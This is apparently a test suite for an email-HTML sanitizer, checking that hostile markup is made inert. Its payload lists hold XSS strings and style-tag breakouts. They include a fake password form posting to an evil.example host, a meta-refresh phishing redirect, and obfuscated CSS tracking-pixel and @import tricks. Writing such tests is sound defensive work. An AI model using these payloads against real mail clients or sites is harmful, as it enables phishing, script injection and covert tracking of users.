import { describe, expect, it } from "vitest"
import { sanitizeCommentHtml, sanitizeEmailHtml, textToHtml } from "../sanitize"
import { toPrefixTsQuery } from "../search"

describe("sanitizeEmailHtml", () => {
  it("removes scripts, handlers, forms and javascript: links", () => {
    const { html } = sanitizeEmailHtml(
      `<p onclick="x()">Hi<script>alert(1)</script></p><a href="javascript:alert(1)">x</a><form><input name="p"></form><iframe src="https://evil"></iframe><img src="x" onerror="alert(1)">`,
      { blockRemote: false }
    )
    expect(html).not.toMatch(/script|onclick|onerror|javascript:|<form|<input|<iframe/i)
    expect(html).toContain("<p>Hi</p>")
  })

  it("opens links in a new tab", () => {
    const { html } = sanitizeEmailHtml(`<a href="https://example.com">x</a>`)
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener noreferrer nofollow"')
  })

  it("blocks remote images and CSS backgrounds unless allowed", () => {
    const input = `<img src="https://tracker.test/p.gif"><div style="background:url(https://tracker.test/bg.png)">x</div><style>@import url(https://x.test/a.css); .a{background:url('https://x.test/b.png')}</style>`
    const blocked = sanitizeEmailHtml(input, { blockRemote: true })
    expect(blocked.hasRemoteImages).toBe(true)
    expect(blocked.html).toContain('data-blocked-src="https://tracker.test/p.gif"')
    expect(blocked.html).not.toMatch(/ src="https:\/\/tracker/)
    expect(blocked.html).not.toContain("url(https://tracker.test/bg.png)")
    expect(blocked.html).not.toContain("@import")
    const allowed = sanitizeEmailHtml(input, { blockRemote: false })
    expect(allowed.html).toContain('src="https://tracker.test/p.gif"')
  })

  it("rewrites cid: images to attachment urls", () => {
    const { html } = sanitizeEmailHtml(`<img src="cid:logo@x">`, { cidMap: new Map([["logo@x", "/api/w/acme/attachments/1?inline=1"]]) })
    expect(html).toContain('src="/api/w/acme/attachments/1?inline=1"')
  })

  it("drops <title> contents and keeps text", () => {
    const { html } = sanitizeEmailHtml(`<html><head><title>Secret title</title></head><body><p>Body</p></body></html>`)
    expect(html).not.toContain("Secret title")
    expect(html).toContain("<p>Body</p>")
  })
})

describe("textToHtml", () => {
  it("escapes, linkifies and quotes", () => {
    const html = textToHtml("Hi <b>\nsee https://example.com/a?b=1.\n> quoted line")
    expect(html).toContain("&lt;b&gt;")
    expect(html).toContain('<a href="https://example.com/a?b=1"')
    expect(html).toContain('<blockquote type="cite">')
  })
})

describe("sanitizeCommentHtml", () => {
  it("keeps mentions and extracts their ids", () => {
    const id = "d3e5c8d9-d125-408f-9561-8ce26af07707"
    const out = sanitizeCommentHtml(`<p>Hey <span data-type="mention" data-id="${id}" data-label="Maya" onclick="x">@Maya</span> <img src=x onerror=alert(1)><b>now</b></p>`)
    expect(out.mentionIds).toEqual([id])
    expect(out.html).toContain(`data-id="${id}"`)
    expect(out.html).not.toMatch(/onclick|onerror|<img/)
    expect(out.text).toContain("@Maya")
  })
})

describe("toPrefixTsQuery", () => {
  it("builds a prefix query from free text", () => {
    expect(toPrefixTsQuery("Invoice 42!")).toBe("invoice:* & 42:*")
    expect(toPrefixTsQuery("   ")).toBeNull()
    expect(toPrefixTsQuery("it's")).toBe("it:* & s:*")
  })
})

describe("remote content detection", () => {
  it("blocks protocol tricks and escaped CSS", () => {
    const input = `<img src="\\\\evil.test/p.gif"><img src="http:evil.test/q.gif"><div style="background-image:u\\72l(https://evil.test/r.png)">a</div><div style="background:image-set('https://evil.test/s.png' 1x)">b</div><img src="/api/w/acme/attachments/1?inline=1">`
    const { html, hasRemoteImages } = sanitizeEmailHtml(input, { blockRemote: true })
    expect(hasRemoteImages).toBe(true)
    expect(html).not.toMatch(/ src="\\\\\\\\evil| src="http:evil|evil\.test\/r\.png|evil\.test\/s\.png/)
    expect(html).toContain('src="/api/w/acme/attachments/1?inline=1"')
  })
})

describe("<style> content can't create markup (M1)", () => {
  const payloads = [
    `<p>Hello</p><style><<a>/style><<a>img src=x onerror="alert(document.domain)"></style>`,
    `<style><<b>/style><<b>meta http-equiv="refresh" content="0;url=https://evil.example/phish"></style>`,
    `<style><<i>/style><<i>form action="https://evil.example/c"><<i>input name=password><<i>button>Go<<i>/button></style>`,
    `<style><<i>/style><<i>img src="https://track.evil/pixel.png"></style>`,
    `<style>\\3c\\3c a\\3e/style\\3e\\3c\\3c a\\3eimg src=x onerror=alert(1)\\3e</style>`,
    `<style>a{} </st<style>yle><img src=x onerror=alert(1)></style>`,
    `<style>a{}</style\f><img src=x onerror=alert(1)></style>`,
    `<style>@import url("x</style><img src=x onerror=alert(1)>");</style>`,
  ]

  it.each(payloads)("keeps %s inert", (payload) => {
    for (const blockRemote of [true, false]) {
      const { html } = sanitizeEmailHtml(payload, { blockRemote })
      // CSS inside <style> never holds a "<", so it can't end the element or start a tag
      for (const m of html.matchAll(/<style[^>]*>([\s\S]*?)<\/style>/gi)) expect(m[1]).not.toContain("<")
      // Outside <style> (and in quoted replies, which drop <style>) only sanitized markup remains
      const outside = html.replace(/<style[\s\S]*?<\/style>/gi, "")
      expect(outside).not.toMatch(/onerror|http-equiv|<meta|<form|<input|<button|<iframe|<style/i)
      if (blockRemote) expect(outside).not.toMatch(/ src="https?:/i)
    }
  })

  it("keeps ordinary CSS as written", () => {
    const css = `.a > p{color:#333;font:14px/1.5 "Segoe UI",sans-serif}@media (max-width:600px){.b{display:none!important}}`
    expect(sanitizeEmailHtml(`<style>${css}</style>`).html).toBe(`<style>${css}</style>`)
    expect(sanitizeEmailHtml(`<div style="color:red;margin:0 auto">x</div>`).html).toBe(`<div style="color:red;margin:0 auto">x</div>`)
  })
})

describe("CSS remote-content and @import filters (L7)", () => {
  it.each([
    `<div style="background:url(&quot;https://track.evil/a'b.png&quot;)">x</div>`,
    `<style>div{background:url("https://track.evil/a'b.png")}</style>`,
    `<div style="background-image:url('https://track.evil/a)b.png')">x</div>`,
    `<div style="background-image:url(https://track.evil/a\\)b.png)">x</div>`,
    `<div style="background:\\75\\72\\6c(https://track.evil/u.png)">x</div>`,
    `<div style="background:URL(https://track.evil/up.png)">x</div>`,
    `<div style="background:url(/\\9/track.evil/tab.png)">x</div>`,
    `<div style="background:url('/\t/track.evil/tab2.png')">x</div>`,
    `<div style="background-image:image-set('https://track.evil/i.png' 1x)">x</div>`,
    `<div style="--u:url(https://track.evil/var.png);background:var(--u)">x</div>`,
    `<style>@font-face{font-family:x;src:url(https://track.evil/f.woff)}</style>`,
    `<div style="background-image:cross-fade(url(https://track.evil/c.png), none)">x</div>`,
  ])("blocks the remote URL in %s", (input) => {
    const { html, hasRemoteImages } = sanitizeEmailHtml(input, { blockRemote: true })
    expect(hasRemoteImages).toBe(true)
    expect(html).not.toContain("track.evil")
  })

  it("fails closed when a fetching function gets its URL from var() or attr()", () => {
    for (const fn of ["image-set(var(--u) 1x)", "src(var(--u))", "image(attr(title))"]) {
      const { html, hasRemoteImages } = sanitizeEmailHtml(`<style>:root{--u:"https://track.evil/v.png"}div{background-image:${fn}}</style>`)
      expect(hasRemoteImages).toBe(true)
      expect(html).toContain("background-image: none }")
    }
  })

  it.each([
    `<style>@import url(https://track.evil/imp.css)</style>`,
    `<style>@import 'https://track.evil/imp.css';</style>`,
    `<style>@im\\70ort url(http://track.evil/x.css);</style>`,
    `<style>@imp@import;ort url(https://track.evil/x.css);</style>`,
    `<style>@IMPORT "https://track.evil/x.css" screen; a{color:red}</style>`,
  ])("drops @import in %s (even when remote content is allowed)", (input) => {
    const { html } = sanitizeEmailHtml(input, { blockRemote: false })
    expect(html).not.toMatch(/@import|@im\\70ort/i)
    // Nothing that re-assembles into @import on a second pass either
    expect(sanitizeEmailHtml(html, { blockRemote: false }).html).not.toMatch(/@import/i)
  })

  it("keeps local urls and the rules after a dropped @import", () => {
    const { html, hasRemoteImages } = sanitizeEmailHtml(
      `<style>@import "https://x.test/a.css"; .logo{background:url(data:image/png;base64,iVBORw0KGgo=)} .p{background:url('/api/w/acme/attachments/1?inline=1')}</style>`
    )
    expect(hasRemoteImages).toBe(false)
    expect(html).toContain("url(data:image/png;base64,iVBORw0KGgo=)")
    expect(html).toContain("url('/api/w/acme/attachments/1?inline=1')")
  })

  it("removes expression() and legacy binding properties", () => {
    const { html } = sanitizeEmailHtml(`<div style="width:expr\\65ssion(alert(1));behavior:url(x.htc);-moz-binding:url(x.xml)">x</div>`, {
      blockRemote: false,
    })
    expect(html).not.toMatch(/expr|alert|behavior|binding/i)
  })

  it("treats img src with tabs or newlines as remote (the URL parser drops them)", () => {
    const { html, hasRemoteImages } = sanitizeEmailHtml(`<img src="/&#9;/track.evil/p.gif"><img src="&#10;//track.evil/q.gif">`)
    expect(hasRemoteImages).toBe(true)
    expect(html).not.toMatch(/ src="[^"]*track\.evil/)
  })
})

describe("CSS sanitizer run time", () => {
  it("stays linear on nested and unclosed fetching functions", () => {
    for (const css of ["a{b:" + "image-set(".repeat(20_000), "a{b:" + `image-set("/x.png" 1x) `.repeat(10_000) + "}", "@import ".repeat(30_000)]) {
      const started = performance.now()
      sanitizeEmailHtml(`<style>${css}</style>`)
      expect(performance.now() - started).toBeLessThan(500)
    }
  })

  it("drops CSS that nests absurdly deep or is oversized (fail closed)", () => {
    expect(sanitizeEmailHtml(`<style>a{b:${"image-set(".repeat(40)}"https://track.evil/x.png"}</style>`).html).toBe("<style></style>")
    expect(sanitizeEmailHtml(`<style>${"a{color:red}".repeat(30_000)}</style>`).html).toBe("<style></style>")
    // Normal nesting is kept
    const nested = `@media screen{@supports (display:grid){.a{width:calc(100% - min(var(--x, 10px), 2em))}}}`
    expect(sanitizeEmailHtml(`<style>${nested}</style>`).html).toBe(`<style>${nested}</style>`)
  })
})
